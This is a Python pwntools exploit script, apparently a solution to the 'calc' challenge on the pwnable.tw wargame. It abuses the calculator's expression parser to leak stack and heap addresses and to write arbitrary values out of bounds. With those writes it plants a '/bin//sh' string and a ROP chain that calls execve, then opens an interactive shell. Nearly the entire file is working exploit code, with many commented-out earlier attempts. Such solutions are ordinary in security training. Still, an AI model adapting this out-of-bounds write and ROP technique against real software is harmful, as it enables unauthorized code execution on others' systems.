from pwn import *
from numpy import uint32

def tohex(val, nbits):
  return hex((val + (1 << nbits)) % (1 << nbits))


#context(terminal=['tmux', 'splitw', '-v'])

#RUN TMUX FIRST OR THIS WONT WORK LOL
context(terminal=['tmux', 'new-window'])

context(os = 'linux', arch = 'x86_64')
context.log_level = 'DEBUG'

prev_stack_addy = 0
#context.arch = 'i386'

#p = gdb.debug('./start', 'b _start')
if len(sys.argv) > 2 and sys.argv[1] == 'debug':
        p = gdb.debug('./calc', 'b *' + sys.argv[2])
elif len(sys.argv) > 1 and sys.argv[1] == 'debug':
    p = gdb.debug('./calc')
else:
    #p = process('./calc')
    p = remote('chall.pwnable.tw', 10100)

def sendPayload(payload):

    p.sendline(payload)
    p.recvline()

def getStack():
    payload = "/11112111333344445555666677778+400"
    #payload = "/11112111+400"

    p.recvuntil("=== Welcome to SECPROG calculator ===\n")
    p.sendline(payload)

    stack = p.recvline()[:10].strip()

    stack = tohex(int(stack), 32)

    return stack

def getHeap(stack):
    heap_stack = int(stack, 0)-1884
    epb_stack = int(stack, 0)-164

    x =  heap_stack + 1436 - epb_stack
    x = ((int(tohex(x, 32), 0))/4) + 2

    payload = "/55555555555555555555555555555+" + str(x)
    p.sendline(payload)

    heap = p.recvline()[:10].strip()

    heap = tohex(int(heap), 32)

    return heap

def writeToGot(stack_addy):
    overflow = 4294967295 - int(stack_addy, 0)
    got_addy_payload = ((0x80ec03c+overflow)/4) + 403
    sendPayload('/87678987+' + str(got_addy_payload-1) + '+' + str(0x80bc4f6))

def writeToStack(stack_addy, offset, offset_2,  value):
    global prev_stack_addy
    calc_ret_addy = int(stack_addy, 0) - offset
    overflow = 4294967295 - int(stack_addy, 0)
    prev_stack_addy = calc_ret_addy + overflow + offset_2*4
    calc_ret_addy_payload = ((calc_ret_addy + overflow)/4) + offset_2
    sendPayload('/10+' + str(calc_ret_addy_payload) + '+' + str(value))

def writeToStackBack(stack_addy, offset, offset_2):
    calc_ret_addy = int(stack_addy, 0) - offset
    overflow = 4294967295 - int(stack_addy, 0)
    calc_ret_addy_payload = ((calc_ret_addy + overflow)/4) + offset_2
    print 'str(prev_stack_addy) :: ' + str(prev_stack_addy)
    sendPayload('/10-' + str(calc_ret_addy_payload) + '-' + str(prev_stack_addy))

def writeToHeap(stack, address, value, offset_1, offset_2, offset_3, operator):
    array_stack = int(stack, 0)-offset_1

    x = 4294967295 - array_stack

    x = int(address, 0) + x #write to heap


    print '4294967295 - array_stack + int(heap, 0) :: ' + str(x)

    x = (x/4) + offset_2

    print '(x/4) :: ' + str(x)
    print 'int(tohex(x, 32), 0) :: ' + str(int(tohex(x, 32), 0))

    payload = "/6789867" + operator + str(int(tohex(x, 32), 0) - offset_3) + operator + str(value)
    #payload = "/678984323-" + str(int(tohex(x, 32), 0) - offset_3)
    p.sendline(payload)


    output = p.recvline()[:10].strip()

    print 'writeToHeap output :: ' + output


stack_addy = getStack()
heap_addy = getHeap(stack_addy)

#writeToHeap(stack_addy, heap_addy, 0x68732f2f, 1604, 1, 27)  #//sh
#writeToHeap(stack_addy, heap_addy, 50882149, 1604, 1, 27, "+")  #//sh
#writeToHeap(stack_addy, heap_addy, 993406714, 1604, 1, 27, "+")  #//sh
writeToHeap(stack_addy, heap_addy, 100892645, 1604, 1, 27, "+")  #//sh
writeToHeap(stack_addy, heap_addy, 2, 1604, 1, 27, "+")  #//sh
writeToHeap(stack_addy, heap_addy, 893385722, 1604, 1, 26, "+")  #//sh
writeToHeap(stack_addy, heap_addy, 117570246, 1604, 1, 25, "-")  #//sh


#writeToHeap(stack_addy, stack_addy, 100000000, 1548, 1, 25, "-")  #//sh  32

#writeToHeap(stack_addy, heap_addy, 100020951, 1604, 1, 28)  #/bin

#writeToHeap(stack_addy, heap_addy, 0x6e69622f, 1604, 1, 25)  #/bin
#writeToHeap(stack_addy, heap_addy, 0x6e69622f, 1604, 1, 25)  #/bin
#writeToHeap(stack_addy, heap_addy, 0x6e69622f, 1604, 1, 25)  #/bin

#writeToStack(stack_addy, 160, 402, 0x80bc4f6)
writeToStack(stack_addy, 160, 402, 0x080701d0)
#writeToStack(stack_addy, 160, 402, 0x080701d0)
writeToStack(stack_addy, 160, 404, int(heap_addy, 0)-128)
#writeToStack(stack_addy, 160, 404, int(heap_addy, 0)-120)
#writeToStack(stack_addy, 160, 406, 0x080701a8)
writeToStack(stack_addy, 160, 406, 0x080534ab)
writeToStack(stack_addy, 160, 408, int(heap_addy, 0)-128)
writeToStack(stack_addy, 160, 410, 0x080534a9)
#writeToStack(stack_addy, 160, 410, 0x0807087e)
writeToStack(stack_addy, 160, 412, int(heap_addy, 0)-112)
writeToStack(stack_addy, 160, 414, 0x080bf46d)
writeToStack(stack_addy, 160, 416, 0x080bf46d)
writeToStack(stack_addy, 160, 418, 0x080bf46d)
writeToStack(stack_addy, 160, 420, 0x080bf46d)
writeToStack(stack_addy, 160, 422, 0x080bf46d)
writeToStack(stack_addy, 160, 424, int(heap_addy, 0)-112)
writeToStack(stack_addy, 160, 426, 0x080bede0)
#writeToStack(stack_addy, 160, 424, 0x080bf6af)
#writeToStack(stack_addy, 160, 426, int(heap_addy, 0)-112)
writeToStack(stack_addy, 160, 428, 11)
writeToStack(stack_addy, 160, 430, 0x0808c8ae)
writeToStack(stack_addy, 160, 432, 0x8049a21)
writeToStack(stack_addy, 160, 434, 0x8049a21)

#writeOffsetToStack(stack_addy, 160, 432, 400)
#writeOffsetToStack(stack_addy, 160, 434, 22000)
#writeToStack(stack_addy, 160, 430, 0x080bf46f)
#writeToStack(stack_addy, 160, 432, 0x080bee06)
#writeToStack(stack_addy, 160, 434, 0x080bee08)
#writeToStack(stack_addy, 160, 436, int(heap_addy, 0)-112)
#writeToStack(stack_addy, 160, 438, int(heap_addy, 0)-112)
#writeToStack(stack_addy, 160, 440, int(heap_addy, 0)-112)
#writeToStack(stack_addy, 160, 406, int(heap_addy, 0)-112)
#writeToStack(stack_addy, 160, 408, int(heap_addy, 0))
#writeToStack(stack_addy, 160, 410, int(heap_addy, 0))
#writeToStack(stack_addy, 160, 407, 0x77777777)


#sendPayload("asdlknadna")


p.interactive()

